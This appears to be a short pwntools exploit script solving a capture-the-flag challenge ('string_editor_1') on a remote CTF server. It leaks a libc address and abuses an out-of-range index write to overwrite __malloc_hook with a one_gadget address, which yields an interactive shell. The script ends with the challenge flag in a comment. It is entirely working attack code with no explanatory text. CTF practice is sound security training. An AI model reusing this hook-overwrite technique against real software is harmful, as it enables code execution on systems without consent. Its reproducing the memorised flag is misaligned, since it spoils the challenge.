from pwn import *

r = remote('chal.imaginaryctf.org', 42004)
libc = ELF('./libc.so.6', checksec=False)

# r = process('./string_editor_1')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

system = libc.sym['system']
hook = libc.sym['__malloc_hook']

r.readline()
r.readline()
leak = int(r.readline().split()[-1], 16) - system
hooh_p = leak + hook

print(hex(hooh_p))
r.recvuntil(b'pallette)\n')
r.sendline('15')
r.readline()
r.sendline('1')
leak_add = int(r.readline().split()[-1], 16)

aaa = hooh_p - leak_add + 15
one = 0xe6c81 + leak
p = (one).to_bytes(6, byteorder='little')
print(p)
for i in range(len(p)):
    r.recvuntil(b'pallette)\n')
    r.sendline(str(aaa+i))
    r.readline()
    r.sendline(p8(p[i]))
r.recvuntil(b'pallette)\n')
r.sendline('15')
r.interactive()

# ictf{alw4ys_ch3ck_y0ur_1nd1c3s!_4e42c9f2}
